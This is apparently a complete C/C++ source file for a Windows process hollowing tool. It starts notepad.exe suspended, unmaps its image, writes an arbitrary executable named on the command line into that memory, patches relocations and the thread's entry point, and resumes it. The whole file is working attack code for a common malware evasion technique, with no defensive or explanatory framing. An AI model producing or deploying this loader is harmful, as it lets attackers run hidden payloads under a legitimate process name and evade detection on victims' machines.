#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <winternl.h>
#include "Header.h"
#include <iostream>


int main(int argc, char* argv[]) {

	if (argc != 2) {
		printf("Usage: Process Hollowing.exe [Binary you want to Inject]\n");
		return 0;
	}


	// Creating Suspended Process And Mapping a File To Memory
	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	PROCESS_INFORMATION procInfo;


	printf("[+] Creating Notepad.exe as Suspended Process.\n");
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);

	// Get All The Register Values
	printf("[+] Getting Current Context.\n");
	LPCONTEXT threadContext = new CONTEXT();
	threadContext->ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(procInfo.hThread, threadContext)) {
		printf("[-] Error getting context\n");
		return 0;
	}

	// Get The Base Address Of The Suspended Process
	PVOID baseAddress;

#ifdef _X86_ 
	ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &baseAddress, sizeof(PVOID), NULL);
#endif

#ifdef _WIN64
	ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
#endif

	// Getting The Address Of NtUnmapViewOfSection And Unmapping All Sections
	printf("[+] Unmapping the Memory Section of Target Process.\n");
	HMODULE ntdllHandle = GetModuleHandleA("ntdll");
	FARPROC ntUnmapViewOfSectionProc = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	_NtUnmapViewOfSectionFunc ntUnmapViewOfSection = (_NtUnmapViewOfSectionFunc)ntUnmapViewOfSectionProc;
	if (ntUnmapViewOfSection(procInfo.hProcess, baseAddress)) {
		printf("[-] Error to unmap the Section\n");
		return 0;
	}

	// Open PE file and read it into memory
	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open PE file." << std::endl;
		return 1;
	}
	// Get the file size
	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		std::cerr << "Failed to get file size" << std::endl;
		CloseHandle(hFile);
		return 1;
	}

	// Allocate buffer
	char* PEBytes = (char*)malloc(fileSize);
	if (PEBytes == nullptr) {
		std::cerr << "Failed to allocate memory" << std::endl;
		CloseHandle(hFile);
		return 1;
	}

	// Read the file into memory
	DWORD bytesRead;
	if (!ReadFile(hFile, PEBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		std::cerr << "Failed to read file into memory" << std::endl;
		free(PEBytes);
		CloseHandle(hFile);
		return 1;
	}

	CloseHandle(hFile);
	

	// Getting The DOS Header And The NT Header 
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)PEBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)PEBytes + dosHeader->e_lfanew);

	// Allocating Memory in Suspended Process
	PVOID allocatedMemory = VirtualAllocEx(procInfo.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

#ifdef _X86_
	// Calculate The Offset Of the 32-bits Process Base Address From The File's Base Address
	DWORD baseOffset = (DWORD)baseAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("Original Process Base: 0x%p\nInject File Base: 0x%p\nOffset: 0x%p\n\n", ntHeaders->OptionalHeader.ImageBase, baseAddress, baseOffset);

	// Change The File's Base Address To The Base Address Of The Suspended Process
	ntHeaders->OptionalHeader.ImageBase = (DWORD)baseAddress;
#endif
#ifdef _WIN64
	// Calculate The Offset Of the 64-bits Process Base Address From The File's Base Address
	DWORD64 baseOffset = (DWORD64)baseAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("[+] Original Process Base: 0x%p\n[+] Inject File Base: 0x%p\n\n", ntHeaders->OptionalHeader.ImageBase, baseAddress);

	// Change The File's Base Address To The Base Address Of The Suspended Process
	ntHeaders->OptionalHeader.ImageBase = (DWORD64)baseAddress;
#endif

	// Write The File's Headers To The Allocated Memory In The Suspended Process
	if (!WriteProcessMemory(procInfo.hProcess, baseAddress, PEBytes, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {
		printf("Failed to write Headers\n");
		return 0;
	}

	// Write All The Sections From The Mapped File To The Suspended Process
	PIMAGE_SECTION_HEADER sectionHeader;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		// Get The Header Of The Current Section
		sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)PEBytes + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("0x%p -- Writing Section: %s\n", (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress, sectionHeader->Name);

		// Write The Section From The File Into The Allocated Memory
		if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)PEBytes + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {
			printf("Error Writing Section: %s. At: 0x%p\n", sectionHeader->Name, (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress);
		}
	}

	// Check If There Is an Offset Between the Base Addresses
	if (baseOffset) {

		printf("\nRelocating The Relocation Table...\n");

		// Loop Over Every Section
		for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{
			// Get The Header Of The Current Section
			sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)PEBytes + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			// Compare The Section Name To The ".reloc" Section
			char relocSectionName[] = ".reloc";
			if (memcmp(sectionHeader->Name, relocSectionName, strlen(relocSectionName))) {
				// If The Section Is Not The ".reloc" Section Continue To The Next Section
				continue;
			}

			// Get The Address Of The Section Data
			DWORD relocAddress = sectionHeader->PointerToRawData;
			IMAGE_DATA_DIRECTORY relocData = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD offset = 0;

			// Iterate Over The Relocation Table
			while (offset < relocData.Size) {

				// Get The Header Of The Relocation Block
				PRELOCATION_BLOCK blockHeader = (PRELOCATION_BLOCK)&PEBytes[relocAddress + offset];
				printf("\nRelocation Block 0x%p. Size: 0x%p\n", blockHeader->PageAddress, blockHeader->BlockSize);

				offset += sizeof(RELOCATION_BLOCK);

				// Calculate The Entries In The Current Table
				DWORD entryCount = (blockHeader->BlockSize - sizeof(RELOCATION_BLOCK)) / sizeof(RELOCATION_ENTRY);
				printf("%d Entries Must Be Relocated In The Current Block.\n", entryCount);

				PRELOCATION_ENTRY blockEntries = (PRELOCATION_ENTRY)&PEBytes[relocAddress + offset];

				for (int x = 0; x < entryCount; x++)
				{
					offset += sizeof(RELOCATION_ENTRY);

					// If The Type Of The Entry Is 0 We Don't Need To Do Anything
					if (blockEntries[x].Type == 0) {
						printf("The Type Of Base Relocation Is 0. Skipping.\n");
						continue;
					}

					// Resolve The Address Of The Reloc
					DWORD fieldAddress = blockHeader->PageAddress + blockEntries[x].Offset;

#ifdef _X86_
					// Read The Value At That Address
					DWORD entryAddress = 0;
					ReadProcessMemory(procInfo.hProcess, (PVOID)((DWORD)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((DWORD)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {
						printf("Error Writing Entry.\n");
					}
#endif
#ifdef _WIN64
					// Read The Value At That Address
					DWORD64 entryAddress = 0;
					ReadProcessMemory(procInfo.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD64)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {
						printf("Error Writing Entry.\n");
					}
#endif
				}
			}
		}
	}

#ifdef _X86_
	// Write The New Image Base Address
	WriteProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD entryPoint = (DWORD)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext->Eax = entryPoint;
#endif
#ifdef _WIN64
	// Write The New Image Base Address
	WriteProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD64 entryPoint = (DWORD64)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext->Rcx = entryPoint;
#endif

	printf("\n[+] Setting the Thread Context.\n");
	if (!SetThreadContext(procInfo.hThread, threadContext)) {
		printf("Error setting context\n");
		return 0;
	}

	printf("[+] Resuming Thread.\n");
	if (!ResumeThread(procInfo.hThread)) {
		printf("[-]Error resuming thread\n");
		return 0;
	}

	printf("[+] Process Hollowing Technique Done");
	return 0;
}
